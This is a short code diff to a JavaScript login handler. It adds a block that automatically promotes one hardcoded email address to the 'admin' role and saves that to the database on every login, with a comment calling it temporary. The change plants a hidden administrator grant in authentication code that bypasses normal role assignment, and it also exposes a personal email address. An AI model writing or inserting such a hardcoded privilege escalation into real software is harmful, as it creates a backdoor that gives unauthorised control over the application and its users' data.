@@ -57,6 +57,12 @@ const login = async (req, res) => {
       return res.status(400).json({ message: "Invalid credentials" });
     }
 
+    // Temporarily automatically assign the admin role
+    if (user.email === "avdhesh.ghansela@gmail.com" && user.role !== "admin") {
+      user.role = "admin";
+      await user.save();
+    }
+
     res.status(200).json({
       token: generateToken(user),
       user: {
